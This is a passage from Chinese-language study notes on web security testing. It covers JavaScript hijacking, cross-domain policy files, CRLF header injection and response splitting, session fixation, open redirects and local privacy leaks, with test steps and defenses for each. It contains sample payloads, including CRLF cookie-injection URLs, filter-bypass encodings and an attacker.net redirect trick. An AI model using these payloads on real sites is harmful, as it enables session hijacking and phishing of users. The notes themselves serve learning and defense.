<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs html"><span class="hljs-comment">&lt;!--假设应用程序的脚本中，定义了如下变量用于保存临时令牌--&gt;</span><br>...<br>nonce = &#x27;adfa313EFAa00eEF#2j&#x27;;<br>...<br><br><span class="hljs-comment">&lt;!--攻击者可以在引用应用程序的脚本后，再自定义函数捕获该变量--&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">script</span> <span class="hljs-attr">src</span>=<span class="hljs-string">&quot;https://target_app.com/status&quot;</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">script</span>&gt;</span>alert(nonce)<span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span><br></code></pre></td></tr></table></figure>

<blockquote>
<p>变量可能在脚本中的不同位置进行定义，存在作用域的问题；因此攻击者需要了解应用程序脚本内部的逻辑，并进行模仿，以便能准确捕获；</p>
</blockquote>
<h4 id="E4X"><a href="#E4X" class="headerlink" title="E4X"></a>E4X</h4><p>E4X 是指 ECMAScript 进行扩展，增加了对 XML 的支持，但这种支持也引入了新的漏洞；例如 E4X 允许在 Javascript 中直接使用 XML 语法，同时还允许在 XML 中嵌入代码；</p>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs javascript"><span class="hljs-keyword">var</span> foo = <span class="hljs-string">&#x27;&lt;bar&gt;&#123; prompt(&quot;Please enter the value of bar&quot;) &#125;&lt;/bar&gt;&#x27;</span>;<br></code></pre></td></tr></table></figure>

<p>这种特性存在两个漏洞：</p>
<ul>
<li>XML 标签将被注释成为值，导致原本的逻辑失效；</li>
<li>{ } 块中的文本由于作为 javascript 代码执行，因此可用来对 XML 数据进行初始化；</li>
</ul>
<p>攻击者可以适当的位置注入文本，插入任意的 {...} 块，用于捕获敏感数据；</p>
<h4 id="防止-Javascript-劫持"><a href="#防止-Javascript-劫持" class="headerlink" title="防止 Javascript 劫持"></a>防止 Javascript 劫持</h4><ul>
<li>使用令牌，进行 CSRF 防御；</li>
<li>在引用脚本中故意引入无效或有问题的 Javascript 代码（例如无限循环），从而破坏攻击者的引用；而实际的动态代码会使用 XMLHttpRequest 对问题脚本进行预处理，删除其中的问题代码；</li>
<li>使用 POST 请求来获得动态脚本代码，而不是传统的 GET 请求；这样可以避免攻击者使用 script 标签引用脚本；</li>
</ul>
<h2 id="同源策略深入讨论"><a href="#同源策略深入讨论" class="headerlink" title="同源策略深入讨论"></a>同源策略深入讨论</h2><h3 id="同源策略与浏览器扩展"><a href="#同源策略与浏览器扩展" class="headerlink" title="同源策略与浏览器扩展"></a>同源策略与浏览器扩展</h3><p>大多数浏览器扩展都会实施一定程度的同源策略，但是它们之间还是存在一些轻微的区别，有时候这种区别会引入一些不易察觉的漏洞；</p>
<h4 id="同源策略与-Flash"><a href="#同源策略与-Flash" class="headerlink" title="同源策略与 Flash"></a>同源策略与 Flash</h4><p>Flash 有个特性，即它的源是由加载 Flash 对象的 URL 所有在域决定的，而不是由加载 Flash 对象的 HTML 页面的 URL 决定的；例如在 A 网站的 HTML 页面，加载了 B 网站的 Flash 对象，则该 Flash 对象的源指向 B 网站；该 Flash 对象会与同一来源的对象或者后端进行交互，同时还可以调用浏览器的 URLRequest API 提出跨域请求（但不能读取响应）；</p>
<p>Flash 有另外一个特征，即对象源可以通过发布策略文件，对来自其他域的 Flash 对象进行授权，以完成双向的交互；当某个来源于 A 网站 Flash 对象，尝试对 B 网站发起跨域请求时，浏览器会检查 B网站的策略文件，看是否接受来自 A 网站的请求；</p>
<blockquote>
<p>策略文件一般放在根目录下的 crossdomain.xml 文件中</p>
</blockquote>
<p><img src="https://lhwccw.oss-cn-shenzhen.aliyuncs.com/20210316090308.png" srcset="/img/loading.gif" lazyload></p>
<p>渗透测试步骤：</p>
<p>不管目标程序是否使用 Flash，都应该检查一下 crossdomain.xml 文件，因为通常在该文件中存放着跨域的策略；如果目标程序 A 有在该文件中向域 B 授权，那么来自域 B 的 Flash 对象有权与 A 进行交互；</p>
<ul>
<li>如果文件中的策略为 allow-access-from domain=“*”，则意味着应用程序允许无限制的访问，任何其他站点都可以和应用程序执行双向交互，控制用户的会话，检索全部的数据，执行任何用户的操作；</li>
<li>如果应用程序允许子域与其进行交互，那么攻击者可以利用子域上可能存在的 XSS 漏洞，来与父域进行交互；如果子域能够付费播放攻击者的 Flash 广告，那么攻击者就可以用其设计过的 Flash 对象来实现交互，读取数据；</li>
<li>策略文件中可能包含内网的主机名等一些对攻击者非常有帮助的信息；</li>
</ul>
<p>目前大多数 Web 程序都没有在 /crossdomain.xml 路径存放策略文件，开发者假设没有该文件意味着自动禁止所有的跨域访问。但实际上，Flash 浏览器的行为并不是这样的，当它在默认的顶级位置找不到策略文件时，如果有指定其他的下载 URL 路径，那么它会到该路径下面去寻找；当该路径的响应确实是一个 XML 格式的文件，并且在 content-type 消息头中也备注了是 XML 类型，那么浏览器就会接受该文件；这意味着，如果应用程序存在某个功能，允许用户上传文件到其域中，那么攻击者就可以先上传自定义的策略文件到应用程序中，然后在 Flash 对象中指定访问该上传路径，读取到其上传的策略文件，得到授权；</p>
<h4 id="同源策略与-Silverlight"><a href="#同源策略与-Silverlight" class="headerlink" title="同源策略与 Silverlight"></a>同源策略与 Silverlight</h4><p>Silverlight 的源认定跟 Flash 是一样的，那由加载对象的 URL 所在的域决定；但 Silverlight 有一点比 Flash 宽松，即它在源认定中不限制协议和端口，这意味着只要是相同域名就可以了，HTTP 还是 HTTPS 无所谓，不同端口号也无所谓；</p>
<p>Silverlight 的跨域策略文件位置为 /clientaccesspolicy.xml，以下示例是微软家的：</p>
<p><img src="https://lhwccw.oss-cn-shenzhen.aliyuncs.com/20210317082813.png" srcset="/img/loading.gif" lazyload></p>
<blockquote>
<p> Flash 的潜在漏洞点，同样也适用于 Silverlight</p>
</blockquote>
<h4 id="同源策略与-Java"><a href="#同源策略与-Java" class="headerlink" title="同源策略与 Java"></a>同源策略与 Java</h4><p>Java 的同源策略有一个特点，即在某些情况下，与来源域共享 IP 地址的其他域，将被视为“同源”；因此，如果有多个应用程序共享主机，会产生跨域交互的可能；</p>
<p>Java 不限制一个域发布自己与其他域进行交互的策略；</p>
<h3 id="同源策略与-HTML5"><a href="#同源策略与-HTML5" class="headerlink" title="同源策略与 HTML5"></a>同源策略与 HTML5</h3><p>XMLHttpRequest 一开始仅允许提出同源的请求，但 H5 引入了新的规则，使其可以和任意域进行交互，只要该域为当前访问提供了权限即可；权限控制通过 HTTP 消息头的多个字段来实现；</p>
<ul>
<li>常规请求（使用现有 HTML 生成的请求，如表单），浏览器将直接发出请求，并检查响应，看是否允许后续的脚本读取该响应的内容；</li>
<li>非常规请求（非 HTML 生成的请求，如 JS ），浏览器先向目标 URL 提出一个 OPTIONS 请求，然后检查消息头，看权限如何设置，然后再决定是否发出该非常规请求（即发请求前，先做一个确认的动作）；</li>
</ul>
<p>不管哪种情况，浏览器在提出请求时，都会在请求的消息头中，将 Origin 字段值设置为提出请求的域，以便目标 URL 的服务器能够依据该值，告知授权情况；服务器会在响应中的 Access-Control-Allow-Origin 字段中，指定其允许访问的来源域；</p>
<p>如果是 OPTIONS 确认请求，目标服务器还会返回更多的字段信息，以便进行更加精细化的权限控制，包括如下几个字段：</p>
<p><img src="https://lhwccw.oss-cn-shenzhen.aliyuncs.com/20210317090210.png" srcset="/img/loading.gif" lazyload></p>
<p>渗透测试步骤：</p>
<ul>
<li>向目标应用程序发起一个包含 Origin 消息头的 XMLHttpRequest 请求，检查其响应，看看其中的 Access-Control 字段的值是如何设置的；</li>
<li>如果支持跨域访问，再发一个 OPTIONS 请求，检查其具体的规则；</li>
</ul>
<p>XMLHttpRequest  的这种跨域新特性引入了新的漏洞；假设攻击者知道目标程序使用 XMLHttpRequest  来发请求，并动态提取响应结果，插入到 HTML 页面中的某个位置；那么攻击者可以先插入一个指向自己控制的服务器的 URL，诱使用户进行点击；然后在自己的服务器上放上相应的恶意文件，等待用户点击后下载，被目标程序提取，插入到页面中；</p>
<h3 id="通过代理服务合并域"><a href="#通过代理服务合并域" class="headerlink" title="通过代理服务合并域"></a>通过代理服务合并域</h3><p>有些 Web 应用程序的功能，实际是在扮演中介的作用；当用户发出某个请求时，它实际上是去其他第三方网站搜索查询，处理后再展示用户，例如很多在线网页翻译程序，它允许用户提交一个网站的 URL，然后它会去抓取该 URL 页面的内容，并将其翻译成指定的语言；</p>
<p>由于翻译程序不会修改源网页的 HTML 标签和 JS ，这时候会出现一个有趣的现象，即对于浏览器来说，页面上的所有内容都隶属于应用程序，但页面内容中实际上包含着来自外部网站的代码；如果用户通过 GT 访问两个域的内容，对于浏览器来说，它们都属于 GT 域；因此，原来来自两个域的代码是不能相互访问的，但是由于现在它们都隶属于 GT 名下，因此，从某种意义上来说，它们变成了同源的，因此，彼此之间可以相互访问；假设其中一个域包含公开、无须登录即可访问的内容，那么攻击者就可以利用这种间接机制，实现跨域的访问；</p>
<h2 id="其他客户端注入攻击"><a href="#其他客户端注入攻击" class="headerlink" title="其他客户端注入攻击"></a>其他客户端注入攻击</h2><h3 id="HTTP-消息头注入"><a href="#HTTP-消息头注入" class="headerlink" title="HTTP 消息头注入"></a>HTTP 消息头注入</h3><p>如果应用程序某个功能使用用户的输入，做为某个消息头字段值的话，那么就可能存在消息头注入漏洞（尤其是当攻击者能够注入换行符时，就可以随心所意插入任意消息头了）；</p>
<p>常见的两个注入位置出现在 Location 和 Set-Cookie 字段，前者提取用户输入进行重定向，后者提取用户输入做为偏好存储（例如存储用户的界面语言选项）；</p>
<figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs http"><span class="hljs-keyword">GET</span> <span class="hljs-string">/settings/12/Default.aspx?Language=Enghtlish</span> <span class="hljs-meta">HTTP/1.1</span><br><span class="hljs-attribute">Host</span><span class="hljs-punctuation">: </span>app.com<br><br><span class="language-lasso">HTTP/<span class="hljs-number">1.1</span> <span class="hljs-number">200</span> OK</span><br><span class="language-lasso"><span class="hljs-built_in">Set</span><span class="hljs-params">-Cookie</span>: PreferedLanguag=English</span><br><span class="language-lasso"><span class="hljs-params">...</span></span><br></code></pre></td></tr></table></figure>

<h4 id="利用消息头注入漏洞"><a href="#利用消息头注入漏洞" class="headerlink" title="利用消息头注入漏洞"></a>利用消息头注入漏洞</h4><p>探查消息头注入漏洞的方法，跟探查 XSS 漏洞的方法类似，就是查找用户输入是否会出现在响应的消息头中；</p>
<p>渗透测试步骤：</p>
<ul>
<li>如果用户输入会被提取到响应的消息头中，那么确认应用程序是否接受 URL 编码的回车符（%0d）或者换行符（%0a），以及它们是否会原样在响应中返回；</li>
<li>在确认换行是否在响应中注入成功时，应注意此时换行符不再以 URL 编码的形式出现了，而是被解码后的样子，即报文相应的位置正常应该出现换行；</li>
<li>如果响应中仅返回两个换行符的一个，仍然可以设计出有效的注入方法；</li>
<li>如果换行符被服务端净化了，那么还有如下几种方法可以进行尝试：<ul>
<li>foo%00%0d%0abar：添加一个 null 字节；</li>
<li>foo%250d%250abar：对百分号进行编码；</li>
<li>foo%%0d0d%%0a0abar：后端有可能没有使用递归；</li>
</ul>
</li>
</ul>
<blockquote>
<p>在查看注入是否成功时，除了 HTML 源代码和浏览器插件后，还应使用专门的拦截工具，对响应消息头进行分析，确保注入成功，避免忽略了实际已经成功的可能；</p>
</blockquote>
<h5 id="注入-cookie"><a href="#注入-cookie" class="headerlink" title="注入 cookie"></a>注入 cookie</h5><p>假设目标程序存在 cookie 注入漏洞，则攻击者可以设计一个 URL，在参数中包含要注入的 cookie 值；当用户点击该 URL 后，目标程序会根据收到的请求，返回相应的 cookie 给用户的浏览器，从而实际注入的目的；</p>
<figure class="highlight mel"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs mel"><span class="hljs-comment">// 专门设计的  URL</span><br>GET /setting/<span class="hljs-number">12</span>/<span class="hljs-keyword">default</span>.aspx?Language=English%0d%0aSet-Cookie:+SessId%3d120a12f98e8; HTTP/<span class="hljs-number">1.1</span><br>Host: app.net<br><br><span class="hljs-comment">// 目标程序的响应</span><br>HTTP/<span class="hljs-number">1.1</span> <span class="hljs-number">200</span> OK<br>Set-Cookie: PreferedLanguage=English<br>Set-Cookie: SessId=<span class="hljs-number">120</span>a12f98e8;  <span class="hljs-comment">// 此条为额外注入的 cookie</span><br></code></pre></td></tr></table></figure>

<h5 id="传送其他攻击"><a href="#传送其他攻击" class="headerlink" title="传送其他攻击"></a>传送其他攻击</h5><p>当存在消息头注入漏洞，导致可以注入任意内容时，那么这个漏洞可以用来传送很多其他攻击；</p>
<h5 id="HTTP-响应分割"><a href="#HTTP-响应分割" class="headerlink" title="HTTP 响应分割"></a>HTTP 响应分割</h5><p>当攻击者可以利用消息头漏洞，插入任意的内容时，那么有一种利用该漏洞的攻击方法称为 HTTP 响应分割，攻击者利用它创建一个木马页面，注入代理服务器的缓存中，等待管理员访问该页面，从而获得管理员的密码；过程如下：</p>
<ul>
<li>攻击者利用注入漏洞，将木马页面做为第一个请求的消息头参数，并同时发第二个请求；</li>
<li>代理服务器收到两个请求，转发给应用程序；</li>
<li>应用程序收到两个请求后，生成两个响应；</li>
<li>代理服务器先收到第一个响应，由于注入的存在，该响应被代理服务器解析为两个响应；</li>
<li>其中第二个响应指向管理员登录页面，被代理服务器缓存（通过设置 If-Modified-Since 和 Last-Modified 两个字段，攻击者可以覆盖代理服务器上已存在的管理员登录页面）；</li>
<li>代理服务器收到应用程序的第二个响应，但由于前一个响应已经被解析为两个响应，当前收到的响应，对于代理服务器来说，相当于第三个响应，由于代理服务器判断之前的请求都已经获得响应，因此它会丢弃当前收到的响应；</li>
<li>管理员请求管理页面；</li>
<li>代理服务器发现缓存命中，在响应中直接返回缓存中的木马页面给管理员；</li>
<li>管理员输入密码，发送登录请求；</li>
</ul>
<p><img src="https://lhwccw.oss-cn-shenzhen.aliyuncs.com/20210318090959.png" srcset="/img/loading.gif" lazyload></p>
<p>请求示例：</p>
<p><img src="https://lhwccw.oss-cn-shenzhen.aliyuncs.com/20210318091231.png" srcset="/img/loading.gif" lazyload></p>
<blockquote>
<p>同时发送两个请求，在 HTTP 协议中，这样做是合法的</p>
</blockquote>
<p>响应结果：</p>
<p><img src="https://lhwccw.oss-cn-shenzhen.aliyuncs.com/20210318091127.png" srcset="/img/loading.gif" lazyload></p>
<blockquote>
<p>攻击者发送了两个请求，代理服务器也转发了两个请求，但由于响应分割，应用程序的第一个响应会被代理服务器解析为两个响应；之后应用程序的真正第二个响应会被代理服务器丢弃；</p>
</blockquote>
<h4 id="防止消息头注入漏洞"><a href="#防止消息头注入漏洞" class="headerlink" title="防止消息头注入漏洞"></a>防止消息头注入漏洞</h4><p>防止的最好方法是不提取用户输入做为消息头的数据，如果实在要用，则需要采取以下措施：</p>
<ul>
<li>输入确认：仅包含字母，最大长度为6字节；</li>
<li>输出确认：任何 ASCII 码小 0x20 的字符都应视为可疑字符，应拒绝包含该字符的请求；</li>
</ul>
<h3 id="cookie-注入"><a href="#cookie-注入" class="headerlink" title="cookie 注入"></a>cookie 注入</h3><p>常见的 cookie 注入方式：</p>
<ul>
<li>某些应用程序从请求参数中提取键值对，作为 cookie 值；</li>
<li>某些应用程序存在 HTTP 消息头注入漏洞，可利用该漏洞注入任意的 Set-Cookie 消息头；</li>
<li>某个目标域存在 XSS 漏洞，利用该漏洞设置一个  cookie，然后在该目标域父域或子域中使用；</li>
<li>利用主动中间人攻击（例如使用公共无线网络的用户）；</li>
</ul>
<p>攻击者利用 cookie 达成攻击的方式：</p>
<ul>
<li>某个特殊的 cookie 值可能会破坏应用程序的逻辑；</li>
<li>客户端代码通常直接信任并读取使用 cookie 值，很少加予过滤和净化，因此可以通过 cookie 来实现注入；</li>
<li>某些应用程序在 cookie 上放令牌，实现 CSRF 防御，攻击者可通过修改 cookie 来破坏这种防御；</li>
<li>攻击者通过 cookie 让用户登录自己的账号，下载其提前上传的攻击荷载；</li>
<li>设置任意 cookie，可利用会话固定漏洞；</li>
</ul>
<h4 id="会话固定漏洞"><a href="#会话固定漏洞" class="headerlink" title="会话固定漏洞"></a>会话固定漏洞</h4><p>某些应用程序在用户首次访问后，即为用户分配了一个匿名会话，等用户登录后，该会话保持不变，但权限升级；这里面存在一个漏洞，攻击者可以先访问应用程序，获得一个有效但无权限的会话，然后通过 cookie 注入漏洞，将该会话发给用户使用；一旦用户完成登录，攻击者拥有的这个会话的权限便直接升级了，从而实现了会话劫持；</p>
<p><img src="https://lhwccw.oss-cn-shenzhen.aliyuncs.com/20210319083904.png" srcset="/img/loading.gif" lazyload></p>
<p>只要会话跟用户信息相关，那么即使应用程序没有登录功能，攻击者也能够用会话固定漏洞来窃取用户信息；攻击者只需要先注入 cookie，然后等待用户在某个环节填写个人信息，保存在会话中以后，再用自己掌握的这个会话令牌，向应用程序发起请求，获得用户的个人信息；</p>
<p>有些应用程序很搞笑，它会直接接受用户提交的任意令牌，当检查发现该令牌不在自己的列表中时，会直接使用该令牌为用户创建一个新的会话；攻击者只需要制作一个令牌，然后通过网络任意的分发（如电子邮件），只要有用户点击，使用令牌发出请求，攻击者就可以实施劫持；</p>
<h4 id="查找并利用会话固定漏洞"><a href="#查找并利用会话固定漏洞" class="headerlink" title="查找并利用会话固定漏洞"></a>查找并利用会话固定漏洞</h4><p>存在固定会话漏洞的应用程序的常见特征：</p>
<ul>
<li>应用程序向每个未验证的用户发布一个匿名令牌，并且在用户登录后，不发布新令牌，而是升级旧令牌（多数应用程序服务器的默认配置即是如此）；</li>
<li>应用程序不向未验证的用户发布匿名令牌，仅在用户登录后发布令牌；但是如果用户使用已有令牌和另外一名用户的密码登录，程序没有发布新令牌，而是使用旧令牌来存储新用户的会话；</li>
</ul>
<blockquote>
<p>以上两种情况，攻击者都可以通过注入自己获得的令牌，来劫持用户的会话；</p>
</blockquote>
<p>渗透测试步骤：</p>
<ul>
<li>通过任何可行的办法，获得一个有效的令牌；</li>
<li>访问登录页面，使用该令牌进行登录；</li>
<li>如果登录成功，且应用程序没有发布新令牌，则表示存在固定会话漏洞；</li>
</ul>
<p>如果应用程序没有登录功能，但在某个阶段使用会话来保存用户的敏感信息，那么注意检查用户提交敏感信息的前后，其获得和使用的令牌是否发生了变化；</p>
<p>渗透测试步骤：</p>
<ul>
<li>以完全匿名的用户身份获得一个会话令牌，然后完成提交敏感数据的步骤；</li>
<li>继续浏览，直到任何显示敏感数据的页面；</li>
<li>如果最初获得的令牌，现在可以用来访问显示敏感数据的页面，则表示应用程序存在漏洞；</li>
<li>如果发现漏洞，进一步检查应用程序是否接受并非它发布的令牌；如果接受，则意味着攻击者可以非常容易利用该漏洞；</li>
</ul>
<h4 id="防止会话固定漏洞"><a href="#防止会话固定漏洞" class="headerlink" title="防止会话固定漏洞"></a>防止会话固定漏洞</h4><p>任何时候，只要用户通过验证，应用程序就应该为用户发布一个新令牌；有些特别注重安全的应用程序，甚至使用单页面令牌，来提供深层的防御；</p>
<h3 id="开放式重定向漏洞"><a href="#开放式重定向漏洞" class="headerlink" title="开放式重定向漏洞"></a>开放式重定向漏洞</h3><p>如果应用程序提取用户的输入，作为重定向的数据，那么应用程序可能存在开放式的重定向漏洞；攻击者可以使用该漏洞进行钓鱼攻击，引导用户到攻击者控制的目标页面；由于这个页面是通过重定向到达的，普通用户往往不会对其产生怀疑；</p>
<h4 id="查找并利用漏洞"><a href="#查找并利用漏洞" class="headerlink" title="查找并利用漏洞"></a>查找并利用漏洞</h4><p>检查应用程序所有的重定向响应，一般有以下几种常见的做法：</p>
<p>使用 3XX 状态码和 Location 字段；</p>
<p><img src="https://lhwccw.oss-cn-shenzhen.aliyuncs.com/20210319091713.png" srcset="/img/loading.gif" lazyload></p>
<p>使用 Refresh 消息头，并设置时间间隔为 0，这样就可以立即触发，实现类似重定向的效果；</p>
<p><img src="https://lhwccw.oss-cn-shenzhen.aliyuncs.com/20210319091725.png" srcset="/img/loading.gif" lazyload></p>
<p>使用 HTML 中的 meta 标签，来复制消息头的行为，从而实现重定向的效果；</p>
<p><img src="https://lhwccw.oss-cn-shenzhen.aliyuncs.com/20210319091738.png" srcset="/img/loading.gif" lazyload></p>
<blockquote>
<p>问：meta 标签的用途？</p>
<p>答：HTML 有一些用来表示页面元信息的标签，例如 base, link, script, style, title 等；如果有些元信息无法使用已有的元标签进行表示，则使用 meta 来表示，相当于“其他”；</p>
</blockquote>
<p>使用 Javascript 的 API 来实现重定向</p>
<p><img src="https://lhwccw.oss-cn-shenzhen.aliyuncs.com/20210319091819.png" srcset="/img/loading.gif" lazyload></p>
<p>渗透测试步骤</p>
<ul>
<li>使用拦截器检查应用程序中所有使用了重定向的位置；</li>
<li>分析每个重定向使用了什么样的方法；</li>
</ul>
<p>绝大多数的重定向是不受用户控制的，有一个常见的场景是用户浏览到某个页面时，应用程序要求用户进行登录，此时应用程序会重定向的登录页面；然后在用户登录后，应用程序会重定向跳回之前中止浏览的页面（开发者经常将目标页面的URL 放在请求参数中）；</p>
<p>渗透测试步骤：</p>
<ul>
<li>如果用户提交的数据，在重定向的绝对 URL 中出现，则尝试修改 URL 中的域名，看应用程序是否会对新域名发起访问，重定向到新域名；</li>
<li>如果用户提交的数据，在重定向的相对 URL 中出现，也将其改为另外一域名，然后观察应用程序的反应；</li>
</ul>
<p>如果响应出现以下行为，则说明漏洞存在：</p>
<p><img src="https://lhwccw.oss-cn-shenzhen.aliyuncs.com/20210319092517.png" srcset="/img/loading.gif" lazyload></p>
<blockquote>
<p>有些应用程序允许用户指定 URL，然后应用程序会加载该 URL 指向的内容，到当前页面的 iframe 中；虽然它不是严格意义上的重定向漏洞，但是二者很类似，攻击者可以同样加予利用；</p>
</blockquote>
<p>为了阻止重定向攻击，开发者会对用户的输入进行净化和过滤，一般有如下两种常见的机制：</p>
<h5 id="阻止绝对-URL"><a href="#阻止绝对-URL" class="headerlink" title="阻止绝对 URL"></a>阻止绝对 URL</h5><p>应用程序检查用户的输入是否以 http 开头，此时可尝试通过对 http 进行混淆，看是否能够避开过滤</p>
<p><img src="https://lhwccw.oss-cn-shenzhen.aliyuncs.com/20210323082444.png" srcset="/img/loading.gif" lazyload></p>
<p>应用程序检查并删除 http 字样，此时可尝试添加多个 http；若应用程序没有递归净化，则可能避开</p>
<p><img src="https://lhwccw.oss-cn-shenzhen.aliyuncs.com/20210323082620.png" srcset="/img/loading.gif" lazyload></p>
<p>应用程序检查 URL 是否包含自己的域名，则攻击者可以在其控制的域名中添加应用程序域名作为子域名或路径</p>
<p><img src="https://lhwccw.oss-cn-shenzhen.aliyuncs.com/20210323082841.png" srcset="/img/loading.gif" lazyload></p>
<h5 id="附加绝对前缀"><a href="#附加绝对前缀" class="headerlink" title="附加绝对前缀"></a>附加绝对前缀</h5><p>应用程序开发者可能会在用户的输入前面，添加一个指向自己域名的前缀，来避免重定向漏洞；这种方法不错，但是有个前提，即开发者添加的前缀一定要有斜杠作为结束，不然攻击者仍然有机会操控该 URL 的结果</p>
<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs html"><span class="hljs-comment">&lt;!--假设开发者添加的固定前缀为 http://app.net，则攻击者将输入设计为 .attacker.net，则最终结果变成了如下--&gt;</span><br>http://app.net.attacker.net<br></code></pre></td></tr></table></figure>

<p>有些重定向的动作并不是由服务端的响应来发起的，而是由前端的 js 代码直接提取用户输入来生成的，此时应仔细检查前端 js 代码的逻辑，看其是否存在漏洞；常见的 js 重定向 API 如下：</p>
<ul>
<li>document.location</li>
<li>document.URL</li>
<li>document.open()</li>
<li>window.location.href</li>
<li>window.navigate()</li>
<li>window.open()</li>
</ul>
<h4 id="防止开放式重定向漏洞"><a href="#防止开放式重定向漏洞" class="headerlink" title="防止开放式重定向漏洞"></a>防止开放式重定向漏洞</h4><p>避免提取用户的输入生成重定向目标，是防御重定向漏洞的根本办法；有些开发者使用一个通用的重定向页面 + 目标 URL 参数来实现重定向，比较好的替代办法如下：</p>
<ul>
<li>使用直接指向目标页面的 URL，避免使用重定向页面进行跳转；</li>
<li>使用列表，参数只传索引即可，而不是传送目标 URL；</li>
</ul>
<p>如果一定要将用户的输入合并到 URL 中的话，应该采取如下措施：</p>
<ul>
<li>使用相对 URL 作为输入；严格检查，不要尝试进行净化；确保输入以斜杠+字母开头，或者直接以字母开头，其他情况通通拒绝；</li>
<li>如果用户提交的 URL 不必斜线开头，则添加前缀时务必添加斜线；</li>
</ul>
<p>避免使用前端 JS 代码来实现重定向，因为这部分代码不可控制，而且其逻辑完全暴露在了攻击者面前；</p>
<h3 id="客户端-SQL-注入"><a href="#客户端-SQL-注入" class="headerlink" title="客户端 SQL 注入"></a>客户端 SQL 注入</h3><blockquote>
<p>HTML5 支持客户端使用 SQL 数据库，应用程序可以客户端存储数据，并使用 js 进行访问；此特性有助于客户端的功能实现离线工作；</p>
</blockquote>
<p>当使用 SQL 数据库时，不管是客户端还是服务端，都可能存在 SQL 注入的漏洞，常见的易受攻击的应用程序：</p>
<ul>
<li>社交网络程序：将用户的联系人存储在本地数据库中；</li>
<li>新闻应用程序：将文章和用户评论存储在本地数据库中，以便离线查看；</li>
<li>Web 邮件程序：将电子存储在本地，以便离线状态下能够正常工作，并将写好的邮件在上线后进行发送；</li>
</ul>
<p>如果攻击者实现了 SQL 注入，就可以查询用户本地数据库中的数据，并进行提取发送给攻击者；</p>
<h3 id="客户端-HTTP-参数污染"><a href="#客户端-HTTP-参数污染" class="headerlink" title="客户端 HTTP 参数污染"></a>客户端 HTTP 参数污染</h3><p>攻击者通过针对性的设计 HTTP 请求参数，可以利用服务端应用程序的逻辑，同样，这种做法也可以用于破坏前端的逻辑；漏洞的前提是服务器会提取攻击者的输入，并将其用于生成 URL 的参数，此时攻击者就有机会向 URL 中注入一些额外的参数，破坏该 URL 原本的逻辑；</p>
<h2 id="本地隐私攻击"><a href="#本地隐私攻击" class="headerlink" title="本地隐私攻击"></a>本地隐私攻击</h2><p>在某些场景下，例如网吧，同一台计算机会被很多用户共用使用，并且他们很可能会访问同一个应用程序，因此，攻击者此时有机会访问受害者使用的同一台计算机；</p>
<blockquote>
<p>应用程序会在本地存储一些用户的敏感信息，为了检测存储了哪些信息，最好的办法是使用虚拟机，因为虚拟机里面是一个干净的操作系统和浏览器，很容易找到目标数据；</p>
<p>另外，有时候应用程序存储的数据可能会设置为隐藏模式，因此，需要在文件系统的选项中，将所有隐藏文件显示出来，以方便查找；</p>
</blockquote>
<h3 id="持久性-cookie"><a href="#持久性-cookie" class="headerlink" title="持久性 cookie"></a>持久性 cookie</h3><p>多数浏览器支持持久性 cookie 的功能，并将这些 cookie 值保存在本地文件系统中；一些应用程序会使用该功能保存敏感数据；</p>
<p>渗透测试步骤</p>
<ul>
<li>在解析应用程序的环节中，特别注意带有 set-cookie 指令的响应，如果其中包含 expire 属性，则该 cookie 值将被保存，直到过期；</li>
<li>如果某个持久性的 cookie 中包含敏感数据，由于攻击者能够使用同一台电脑，因此攻击者能够马上获取该 cookie 中的数据。例如直接使用 cookie 中的令牌，无须破译其中的内容，以受害者的身份访问应用程序；</li>
</ul>
<h3 id="缓存-Web-内容"><a href="#缓存-Web-内容" class="headerlink" title="缓存 Web 内容"></a>缓存 Web 内容</h3><p>大多数浏览器默认会将非 SSL 页面的内容保存在缓存中，并存储在本地文件系统中，除非应用程序有在响应中明确要求不要保存；</p>
<p>渗透测试步骤</p>
<ul>
<li>检查服务器的 HTTP 响应内容，查看其中的缓存指令；</li>
<li>禁止缓存的相关指令包括：<ul>
<li>Expires: 0</li>
<li>Cache-Control: no-cache</li>
<li>Pragma： no-cache</li>
</ul>
</li>
<li>如果响应中没有这些指令，那么内容正常都会被浏览器缓存；</li>
<li>使用虚拟机中操作系统默认安装的干净的浏览器，清除所有缓存和cookie，然后访问包含敏感数据的应用程序页面；</li>
<li>检查新增的缓存文件，看其中是否包含敏感数据；</li>
<li>如果新增的缓存文件很多，则提取一个页面字符串，在缓存中进行搜索定位；</li>
<li>不同的浏览器默认的缓存目录不同，应根据情况在不同的位置进行查找；</li>
</ul>
<h3 id="浏览历史记录"><a href="#浏览历史记录" class="headerlink" title="浏览历史记录"></a>浏览历史记录</h3><p>多数浏览器都会保存用户的浏览记录，而某些浏览记录对应的请求，可能使用 GET，因此该请求的参数中，很可能包含有敏感数据；</p>
<p>渗透测试步骤</p>
<ul>
<li>解析应用程序时，注意通过 URL 参数传送敏感数据的所有情况；</li>
<li>如果存在以上情形，查看浏览器的浏览记录，看这些敏感数据是否出现在其中；</li>
</ul>
<h3 id="自动完成"><a href="#自动完成" class="headerlink" title="自动完成"></a>自动完成</h3><p>很多浏览器提供自动完成的功能，该功能会保存用户名、卡号、密码等敏感数据，并将数据存储在本地文件系统中；这些数据可被攻击者访问的同时，还有可能被 XSS 攻击获取（伪表单，诱使用户触发自动完成功能）；</p>
<p>渗透测试步骤</p>
<ul>
<li>解析应用程序中，确定包含表单的源代码位置</li>
